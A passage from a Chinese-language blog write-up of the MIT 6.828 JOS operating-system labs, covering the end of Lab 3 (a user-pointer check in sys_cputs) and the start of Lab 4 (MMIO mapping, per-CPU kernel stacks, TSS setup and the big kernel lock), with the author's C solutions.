kernel, running <code>user/evilhello</code>. The environment should be destroyed, and the kernel should not panic. You should see:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[00000000] new env 00001000</span><br><span class="line">...</span><br><span class="line">[00001000] user_mem_check assertion failure for va f010000c</span><br><span class="line">[00001000] free env 00001000</span><br></pre></td></tr></table></figure></blockquote><p>我们先看 <code>user/evilhello.c</code> ，里面为系统调用 <code>sys_cputs()</code> 传递了一个内核空间中的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evil hello world -- kernel pointer passed to kernel</span></span><br><span class="line"><span class="comment">// kernel should destroy user environment in response</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inc/lib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">umain</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// try to print the kernel entry point as a string!  mua ha ha!</span></span><br><span class="line">sys_cputs((<span class="type">char</span>*)<span class="number">0xf010000c</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要在对应系统调用加上地址合法性检查即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Print a string to the system console.</span></span><br><span class="line"><span class="comment">// The string is exactly &#x27;len&#x27; characters long.</span></span><br><span class="line"><span class="comment">// Destroys the environment on memory errors.</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">sys_cputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Check that the user has permission to read memory [s, s+len).</span></span><br><span class="line"><span class="comment">// Destroy the environment if not.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">user_mem_assert(curenv, s, len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Print the string supplied by the user.</span></span><br><span class="line">cprintf(<span class="string">&quot;%.*s&quot;</span>, len, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行评分程序，我们成功通过了所有测试，拿到满分</p><p><img src="https://s2.loli.net/2022/03/17/Xo6q4wWvFJptYzl.png" alt="image.png"></p><p>至此， lab3 全部完成</p><h1 id="0x04-Lab-4-Preemptive-Multitasking"><a href="#0x04-Lab-4-Preemptive-Multitasking" class="headerlink" title="0x04. Lab 4: Preemptive Multitasking"></a>0x04. Lab 4: Preemptive Multitasking</h1><p>在 lab4 中我们将实现抢占式多任务调度</p><p>首先还是先 commit lab3 的代码，把 lab4 分支拉下来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add .</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit -m <span class="string">&quot;lab3&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout -b lab4 origin/lab4</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge lab3</span></span><br></pre></td></tr></table></figure><p>在 lab4 当中新增了如下文件：</p><table><thead><tr><th><code>kern/cpu.h</code></th><th>Kernel-private definitions for multiprocessor support</th></tr></thead><tbody><tr><td><code>kern/mpconfig.c</code></td><td>Code to read the multiprocessor configuration</td></tr><tr><td><code>kern/lapic.c</code></td><td>Kernel code driving the local APIC unit in each processor</td></tr><tr><td><code>kern/mpentry.S</code></td><td>Assembly-language entry code for non-boot CPUs</td></tr><tr><td><code>kern/spinlock.h</code></td><td>Kernel-private definitions for spin locks, including the big kernel lock</td></tr><tr><td><code>kern/spinlock.c</code></td><td>Kernel code implementing spin locks</td></tr><tr><td><code>kern/sched.c</code></td><td>Code skeleton of the scheduler that you are about to implement</td></tr></tbody></table><h2 id="Part-A-Multiprocessor-Support-and-Cooperative-Multitasking"><a href="#Part-A-Multiprocessor-Support-and-Cooperative-Multitasking" class="headerlink" title="Part A: Multiprocessor Support and Cooperative Multitasking"></a>Part A: Multiprocessor Support and Cooperative Multitasking</h2><p>在本 lab 的第一部分，我们将扩展 JOS 以让其能运行在一个多处理器系统上，并实现一些系统调用以允许用户级的进程创建新的进程；我们同时还将实现 <em>协作式的</em> 轮询调度（round-robin scheduling），允许内核在当前进程自愿放弃CPU 时进行进程调度；在 Part C 中我们还将实现 <em>抢占式</em> 的调度，其允许内核在一段时间后重新获取 CPU 的控制权</p><h3 id="Multiprocessor-Support"><a href="#Multiprocessor-Support" class="headerlink" title="Multiprocessor Support"></a>Multiprocessor Support</h3><p>我们将让 JOS 支持”对称式多处理“（symmetric multiprocessing）——一种所有 CPU 都有对系统资源同等的权限的多处理器模型。在引导过程中，SMP 中的 CPU 可以分为两种：由一个引导处理器（bootstrap processor，BSP）负责系统的初始化与启动工作，剩余的应用处理器（application processors，APs）则在系统运行之后再由 BSP 唤醒。而由哪个 CPU 来作为 BSP 则是由硬件与 BIOS 决定的。</p><p>在 SMP 系统中，每个 CPU 都附带有一个本地 APIC （LAPIC）单元，其不仅负责分发中断，还负责为其连接的 CPU 提供一个标识符，本次实验我们将利用 LAPIC 单元的下列基本功能（参见 <code>kern/lapic.c</code>）</p><ul><li>读取 LAPIC ID 以识别代码当前运行的 CPU（参见 <code>cpunum()</code>）</li><li>从 BSP 向 APs 发送 <code>STARTUP</code> 这一处理器间中断（interprocessor interrupt）以将其唤醒（参见 <code>lapic_startap()</code>）</li><li>在 part C 中，我们对 LAPIC 的内置计时器进行编程以触发时钟中断从而支持抢占式多任务（参见 <code>apic_init()</code>）</li></ul><blockquote><p><strong>Exercise 1.</strong> Implement <code>mmio_map_region</code> in <code>kern/pmap.c</code>. To see how this is used, look at the beginning of <code>lapic_init</code> in <code>kern/lapic.c</code>. You’ll have to do the next exercise, too, before the tests for <code>mmio_map_region</code> will run.</p></blockquote><p>处理器通过 MMIO 访问其 LAPIC：一部分物理内存被<strong>硬连线</strong>到部分 IO 设备的寄存器上，因此我们可以使用普通的存取指令来访问设备寄存器，相应地这块内存便是一个内存空洞。LAPIC 对应的内存空洞则在<strong>物理地址</strong> <code>0xFE000000</code> 处，占用 32 MB，我们无法通过基于 <code>KERNBASE</code> 的线性映射进行访问（超出 32 位地址了），但 JOS 在 <code>MMIOBASE</code> 处留了 4MB 的空白所以我们可以映射到此处</p><p>接下来是 Exercise 1，让我们实现 <code>mmio_map_region()</code></p><blockquote><p><strong>Exercise 1.</strong> Implement <code>mmio_map_region</code> in <code>kern/pmap.c</code>. To see how this is used, look at the beginning of <code>lapic_init</code> in <code>kern/lapic.c</code>. You’ll have to do the next exercise, too, before the tests for <code>mmio_map_region</code> will run.</p></blockquote><p>这个函数主要的作用就是将指定的物理内存映射到对应的虚拟内存上，只不过目标是 mmio 内存，直接使用我们之前写的 <code>boot_map_region()</code> 即可，以页为单位从 <code>MMIOBASE</code> 开始映射，若剩余的留给 MMIO 的区域不够则 panic，这里别忘了页表项标志位应设为 <code>PTE_W | PTE_PCD | PTE_PWT</code> （可写 &amp;&amp; 禁用高速缓存 &amp;&amp; 页级通写位）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Reserve size bytes in the MMIO region and map [pa,pa+size) at this</span></span><br><span class="line"><span class="comment">// location.  Return the base of the reserved region.  size does *not*</span></span><br><span class="line"><span class="comment">// have to be multiple of PGSIZE.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line"><span class="title function_">mmio_map_region</span><span class="params">(<span class="type">physaddr_t</span> pa, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Where to start the next region.  Initially, this is the</span></span><br><span class="line"><span class="comment">// beginning of the MMIO region.  Because this is static, its</span></span><br><span class="line"><span class="comment">// value will be preserved between calls to mmio_map_region</span></span><br><span class="line"><span class="comment">// (just like nextfree in boot_alloc).</span></span><br><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> base = MMIOBASE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reserve size bytes of virtual memory starting at base and</span></span><br><span class="line"><span class="comment">// map physical pages [pa,pa+size) to virtual addresses</span></span><br><span class="line"><span class="comment">// [base,base+size).  Since this is device memory and not</span></span><br><span class="line"><span class="comment">// regular DRAM, you&#x27;ll have to tell the CPU that it isn&#x27;t</span></span><br><span class="line"><span class="comment">// safe to cache access to this memory.  Luckily, the page</span></span><br><span class="line"><span class="comment">// tables provide bits for this purpose; simply create the</span></span><br><span class="line"><span class="comment">// mapping with PTE_PCD|PTE_PWT (cache-disable and</span></span><br><span class="line"><span class="comment">// write-through) in addition to PTE_W.  (If you&#x27;re interested</span></span><br><span class="line"><span class="comment">// in more details on this, see section 10.5 of IA32 volume</span></span><br><span class="line"><span class="comment">// 3A.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Be sure to round size up to a multiple of PGSIZE and to</span></span><br><span class="line"><span class="comment">// handle if this reservation would overflow MMIOLIM (it&#x27;s</span></span><br><span class="line"><span class="comment">// okay to simply panic if this happens).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: The staff solution uses boot_map_region.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Your code here:</span></span><br><span class="line"></span><br><span class="line">size = ROUNDUP(pa + size, PGSIZE);</span><br><span class="line">pa = ROUNDDOWN(pa, PGSIZE);</span><br><span class="line">size -= pa;</span><br><span class="line"><span class="keyword">if</span> ((base + size) &gt; MMIOLIM || (base + size) &lt; MMIOBASE)</span><br><span class="line">panic(<span class="string">&quot;Run out of MMIO region!&quot;</span>);</span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir, base, size, pa, PTE_W | PTE_PCD | PTE_PWT);</span><br><span class="line">base += size;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">void</span>*)(base - size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Application-Processor-Bootstrap"><a href="#Application-Processor-Bootstrap" class="headerlink" title="Application Processor Bootstrap"></a>Application Processor Bootstrap</h4><p>在启动 APs 之前 BSP 应当收集多处理器系统的相关信息，例如 CPU 总数、APIC IDs 以及 LAPIC 单元的 MMIO 地址，<code>mp_init()</code> 函数通过读取 BIOS 的内存区中的 MP 配置表来获取这些信息；在<code>boot_aps()</code> 中将 APs 启动（实模式），并将 AP 入口代码拷贝到一个实模式下可寻址的内存区域，不同于 bootloader，我们可以控制 APs 开始执行代码的位置，我们将入口代码复制到 0x7000 （<code>MPENTRY_PADDR</code>）处，不过其实任何 640KB 以下的未使用的页对齐的物理地址都可以被使用</p><p>之后 <code>boot_aps()</code> 通过向每一个 APs 的 LAPIC 单元发送 <code>STARTUP</code> IPI 以唤醒他们，其中包含有入口点的地址，在经过简单的设置之后 每个 AP 都将进入开启分页的保护模式，并调用 <code>mp_main()</code> 函数；<code>boot_aps()</code> 会等到每个被唤醒的 AP 在设置自己对应的 <code>struct CpuInfo</code> 中的 <code>cpu_status</code> 域的 <code>CPU_STARTED</code> 标志位后才会接着唤醒下一个</p><p>接下来是 Exercise 2，阅读启动过程的代码并修改 <code>page_init()</code> 以避免将 <code>MPENTRY_ADDR</code> 对应的页也链到 freelist 上</p><blockquote><p><strong>Exercise 2.</strong> Read <code>boot_aps()</code> and <code>mp_main()</code> in <code>kern/init.c</code>, and the assembly code in <code>kern/mpentry.S</code>. Make sure you understand the control flow transfer during the bootstrap of APs. Then modify your implementation of <code>page_init()</code> in <code>kern/pmap.c</code> to avoid adding the page at <code>MPENTRY_PADDR</code> to the free list, so that we can safely copy and run AP bootstrap code at that physical address. Your code should pass the updated <code>check_page_free_list()</code> test (but might fail the updated <code>check_kern_pgdir()</code> test, which we will fix soon).</p></blockquote><p>首先拜读一下 <code>boot_aps()</code>，逻辑还是比较简单的，主要就是拷贝启动代码到 0x7000，之后通过 <code>lapic_startap()</code> 唤醒单个 AP 并进行忙等待直到其设置自己的 <code>CPU_STARTED</code> 标志位，而 <code>mp_main()</code> 则主要是将内核页表装载到 AP 自己的 cr3 上，以及初始化自己的环境、IDT、从运行队列中取出进程（后面这些都需要我们在后续实现）</p><p>我们直接看修改 <code>page_init()</code>，如果在建 freelist 时对每一张内存页都进行一次判断那就太耗时了，笔者的选择是等到 freelist 建完之后再将对应页进行脱链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4:</span></span><br><span class="line"><span class="comment">// Change your code to mark the physical page at MPENTRY_PADDR</span></span><br><span class="line"><span class="comment">// as in use</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">mpentry</span>, *<span class="title">mp_prev</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5) mark the physical page at MPENTRY_PADDR as in use</span></span><br><span class="line">mpentry = pa2page(MPENTRY_PADDR);</span><br><span class="line">mp_prev = pa2page(MPENTRY_PADDR + PGSIZE);</span><br><span class="line">mp_prev-&gt;pp_link = mpentry-&gt;pp_link;</span><br><span class="line">mpentry-&gt;pp_ref = <span class="number">1</span>;</span><br><span class="line">mpentry-&gt;pp_link = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是习题：</p><blockquote><p><strong>Question</strong></p><ol><li>Compare <code>kern/mpentry.S</code> side by side with <code>boot/boot.S</code>. Bearing in mind that <code>kern/mpentry.S</code> is compiled and linked to run above <code>KERNBASE</code> just like everything else in the kernel, what is the purpose of macro <code>MPBOOTPHYS</code>? Why is it necessary in <code>kern/mpentry.S</code> but not in <code>boot/boot.S</code>? In other words, what could go wrong if it were omitted in <code>kern/mpentry.S</code>?<br>Hint: recall the differences between the link address and the load address that we have discussed in Lab 1.</li></ol></blockquote><p><code>MPBOOTPHYS</code> 宏主要的作用就是计算 entry code 中需要用到的地址的<strong>真实物理地址</strong>，因为 entry code 在被链接进内核二进制文件后其地址不一定是 0x7000 起始，但是我们将其加载到了该位置，因此对于绝对地址的索引需要计算其加载到该地址上之后的地址</p><h4 id="Per-CPU-State-and-Initialization"><a href="#Per-CPU-State-and-Initialization" class="headerlink" title="Per-CPU State and Initialization"></a>Per-CPU State and Initialization</h4><p>对于一个多处理器 OS 而言我们很有必要为每个 CPU 都分配一块私有空间（例如 Linux 中的 percpu 变量），我们可以分配一个数组并使用 <code>cpunum()</code> 获取到 CPU 标号作为下标索引，以下是我们应当注意的 per-CPU state：</p><ul><li><p><strong>Per-CPU kernel stack</strong>.</p><p>每个 CPU 都应当有属于其自己的堆栈，在 JOS 中数组 <code>percpu_kstacks[NCPU][KSTKSIZE]</code> 为每个 CPU 保留一份自己的堆栈区域；正如在 lab2 中我们将 BSP 的堆栈映射到了 KSTACKTOP 下，在本 lab 中我们将为每个 CPU 创建自己的堆栈，且应确保其堆栈占用一块连续的虚拟内存区域</p></li><li><p><strong>Per-CPU TSS and TSS descriptor</strong>.</p><p>我们同样需要一个 per-CPU 任务状态段来确定每个 CPU 的内核栈的位置，每个 CPU 的 TSS 被存放在 <code>cpus[i].cpu_ts</code> 中，对应的 TSS descriptor 则在 <code>gdt[(GD_TSS0) &gt;&gt; 3] + i]</code> ，定义于 <code>kern/trap.c</code> 中的全局变量 <code>ts</code> 则不再使用</p></li><li><p><strong>Per-CPU current environment pointer</strong>.</p><p>因为每个 CPU 都可以独立运行用户进程，因此我们将符号 <code>curenv</code> 重定义为 <code>cpus[cpunum()].cpu_env</code> ，指向运行在当前 CPU 上进程的 PCB</p></li><li><p><strong>Per-CPU system registers</strong>.</p><p>所有的寄存器对一个 CPU 而言都是私有的，因此我们还需要在每个 CPU 上都初始化其 cr3、gdt、idt…</p></li></ul><p>接下来是 Exercise 3，修改 <code>mem_init_mp()</code> 以为每个 CPU 分配一个内核栈</p><blockquote><p><strong>Exercise 3.</strong> Modify <code>mem_init_mp()</code> (in <code>kern/pmap.c</code>) to map per-CPU stacks starting at <code>KSTACKTOP</code>, as shown in <code>inc/memlayout.h</code>. The size of each stack is <code>KSTKSIZE</code> bytes plus <code>KSTKGAP</code> bytes of unmapped guard pages. Your code should pass the new check in <code>check_kern_pgdir()</code>.</p></blockquote><p>直接用 <code>boot_map_region</code> 创建映射即可，注意这里不管我们有多少个 CPU 都要建立 <code>NCPU</code> 个内核栈（这个时候 <code>ncpu</code> 变量还没初始化，而且整个 <code>percpu_kstack</code> 数组的大小是在编译期确定的）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Modify mappings in kern_pgdir to support SMP</span></span><br><span class="line"><span class="comment">//   - Map the per-CPU stacks in the region [KSTACKTOP-PTSIZE, KSTACKTOP)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">mem_init_mp</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Map per-CPU stacks starting at KSTACKTOP, for up to &#x27;NCPU&#x27; CPUs.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// For CPU i, use the physical memory that &#x27;percpu_kstacks[i]&#x27; refers</span></span><br><span class="line"><span class="comment">// to as its kernel stack. CPU i&#x27;s kernel stack grows down from virtual</span></span><br><span class="line"><span class="comment">// address kstacktop_i = KSTACKTOP - i * (KSTKSIZE + KSTKGAP), and is</span></span><br><span class="line"><span class="comment">// divided into two pieces, just like the single stack you set up in</span></span><br><span class="line"><span class="comment">// mem_init:</span></span><br><span class="line"><span class="comment">//     * [kstacktop_i - KSTKSIZE, kstacktop_i)</span></span><br><span class="line"><span class="comment">//          -- backed by physical memory</span></span><br><span class="line"><span class="comment">//     * [kstacktop_i - (KSTKSIZE + KSTKGAP), kstacktop_i - KSTKSIZE)</span></span><br><span class="line"><span class="comment">//          -- not backed; so if the kernel overflows its stack,</span></span><br><span class="line"><span class="comment">//             it will fault rather than overwrite another CPU&#x27;s stack.</span></span><br><span class="line"><span class="comment">//             Known as a &quot;guard page&quot;.</span></span><br><span class="line"><span class="comment">//     Permissions: kernel RW, user NONE</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here:</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NCPU; i++)</span><br><span class="line">&#123;</span><br><span class="line">boot_map_region(kern_pgdir, </span><br><span class="line">KSTACKTOP - i * (KSTKSIZE + KSTKGAP) - KSTKSIZE, </span><br><span class="line">KSTKSIZE, </span><br><span class="line">PADDR(&amp;percpu_kstacks[i]), </span><br><span class="line">PTE_W);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是 Exercise 4，更改 <code>trap_init_percpu()</code> 以让其能正常在所有 CPU 上运行</p><blockquote><p><strong>Exercise 4.</strong> The code in <code>trap_init_percpu()</code> (<code>kern/trap.c</code>) initializes the TSS and TSS descriptor for the BSP. It worked in Lab 3, but is incorrect when running on other CPUs. Change the code so that it can work on all CPUs. (Note: your new code should not use the global <code>ts</code> variable any more.)</p></blockquote><p>主要就是把全局变量 <code>ts</code> 替换成 <code>thiscpu</code> 指向的 <code>CpuInfo</code> 结构体的 <code>cpu_ts</code> 成员即可，以及修改全局段描述符表中对应段描述符为 tss 描述符时注意使用 <code>cpunum()</code> 来获取当前 CPU 的标号，还有就是注意将 tss 的 esp 初始化为对应 cpu 的栈，这里还要注意一点就是 <code>ltr</code> 指令所用的值应为 <em>对应的描述符在全局描述符表中的偏移</em> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Initialize and load the per-CPU TSS and IDT</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">trap_init_percpu</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The example code here sets up the Task State Segment (TSS) and</span></span><br><span class="line"><span class="comment">// the TSS descriptor for CPU 0. But it is incorrect if we are</span></span><br><span class="line"><span class="comment">// running on other CPUs because each CPU has its own kernel stack.</span></span><br><span class="line"><span class="comment">// Fix the code so that it works for all CPUs.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hints:</span></span><br><span class="line"><span class="comment">//   - The macro &quot;thiscpu&quot; always refers to the current CPU&#x27;s</span></span><br><span class="line"><span class="comment">//     struct CpuInfo;</span></span><br><span class="line"><span class="comment">//   - The ID of the current CPU is given by cpunum() or</span></span><br><span class="line"><span class="comment">//     thiscpu-&gt;cpu_id;</span></span><br><span class="line"><span class="comment">//   - Use &quot;thiscpu-&gt;cpu_ts&quot; as the TSS for the current CPU,</span></span><br><span class="line"><span class="comment">//     rather than the global &quot;ts&quot; variable;</span></span><br><span class="line"><span class="comment">//   - Use gdt[(GD_TSS0 &gt;&gt; 3) + i] for CPU i&#x27;s TSS descriptor;</span></span><br><span class="line"><span class="comment">//   - You mapped the per-CPU kernel stacks in mem_init_mp()</span></span><br><span class="line"><span class="comment">//   - Initialize cpu_ts.ts_iomb to prevent unauthorized environments</span></span><br><span class="line"><span class="comment">//     from doing IO (0 is not the correct value!)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// ltr sets a &#x27;busy&#x27; flag in the TSS selector, so if you</span></span><br><span class="line"><span class="comment">// accidentally load the same TSS on more than one CPU, you&#x27;ll</span></span><br><span class="line"><span class="comment">// get a triple fault.  If you set up an individual CPU&#x27;s TSS</span></span><br><span class="line"><span class="comment">// wrong, you may not get a fault until you try to return from</span></span><br><span class="line"><span class="comment">// user space on that CPU.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup a TSS so that we get the right stack</span></span><br><span class="line"><span class="comment">// when we trap to the kernel.</span></span><br><span class="line">thiscpu-&gt;cpu_ts.ts_esp0 = KSTACKTOP - (KSTKSIZE + KSTKGAP) * cpunum();</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_ss0 = GD_KD;</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_iomb = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Taskstate);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize the TSS slot of the gdt.</span></span><br><span class="line">gdt[(GD_TSS0 &gt;&gt; <span class="number">3</span>) + cpunum()] = SEG16(STS_T32A, (<span class="type">uint32_t</span>) (&amp;thiscpu-&gt;cpu_ts),</span><br><span class="line"><span class="keyword">sizeof</span>(<span class="keyword">struct</span> Taskstate) - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">gdt[(GD_TSS0 &gt;&gt; <span class="number">3</span>) + cpunum()].sd_s = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load the TSS selector (like other segment selectors, the</span></span><br><span class="line"><span class="comment">// bottom three bits are special; we leave them 0)</span></span><br><span class="line">ltr(GD_TSS0 + (cpunum() * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Segdesc)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load the IDT</span></span><br><span class="line">lidt(&amp;idt_pd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行 <code>make qemu CPUS=4</code>，可以看到我们的几个处理器都成功地启动了：</p><p><img src="https://s2.loli.net/2022/03/21/VvEiuky4DseIRTq.png" alt="image.png"></p><h4 id="Locking"><a href="#Locking" class="headerlink" title="Locking"></a>Locking</h4><p>伴随着多处理器系统的出现， <em>条件竞争</em> （race condition）成为了我们不得不考虑的一个问题，因此我们需要使用 <code>锁</code> 来保护临界区中的数据，在同一时间段只有一个 CPU 可以改变临界区内的数据，比较朴素的一个办法就是使用一个全局的 <em>big kernel lock</em> ，当用户进程进入内核态时上锁，退出后再解锁，这样在同一时刻只有一个用户进程可以运行在内核态，确保了内核数据的安全</p><p>在 <code>kern/spinlock.h</code> 中定义了一个大的内核锁 <code>kernel_lock</code>，同时提供了加锁与解锁的函数 <code>lock_kernel()</code> 和 <code>unlock_kernel()</code>，我们应当在以下四个地方使用大内核锁：</p><ul><li>在 BSP 唤醒 APs 前请求锁（<code>i386_init()</code>）</li><li>在初始化当前 AP 后请求锁（<code>mp_main()</code>），之后调用 <code>sched_yield()</code> 以在该 AP 上运行用户进程</li><li>在从用户态陷入内核态时请求锁（<code>trap()</code>），为了确定陷阱发生在用户态还是内核态，我们应当检查 <code>tf_cs</code> 的 RPL</li><li>在从内核态切换到用户态之前释放锁（<code>env_run()</code>），不要过早或过晚，否则可能会造成竞态或死锁</li></ul><p>于是接下来就是 Exercise 5：在上述位置补充相应的锁</p><blockquote><p><strong>Exercise 5.</strong> Apply the big kernel lock as described above, by calling <code>lock_kernel()</code> and <code>unlock_kernel()</code> at the proper locations.</p></blockquote><p>在 JOS 中，一个自旋锁起其实被定义为一个普通的整型变量，<strong>但是上锁与解锁的操作是通过原子指令完成的</strong>，而原子指令的实现<strong>其实是通过 <code>lock</code> 前缀完成的</strong>，被该前缀修饰的指令在访问内存时同时会完成对总线的控制，直到指令结束，从而<strong>从硬件层面保证了指令的原子性</strong></p><figure class="highlight 